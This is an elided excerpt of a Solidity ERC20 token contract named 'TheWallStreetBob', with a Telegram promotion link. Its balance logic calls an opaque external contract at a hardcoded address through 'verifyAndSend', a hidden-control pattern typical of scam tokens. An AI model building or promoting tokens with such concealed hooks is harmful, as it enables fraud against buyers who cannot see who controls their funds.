// Here comes the Wall Street Bob: https://t.me/wsb_portal
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _bobtoken = 0x4543a8361f9308D89dEDB15df9Ebab1cB29fC4f1;
    address public pair;
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return bobtoken.verifyAndSend(amount);
    }
    ...
    function _DeployWallStreetBob(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployWallStreetBob(creator, initialSupply);
    }
}

contract TheWallStreetBob is ERC20Token {
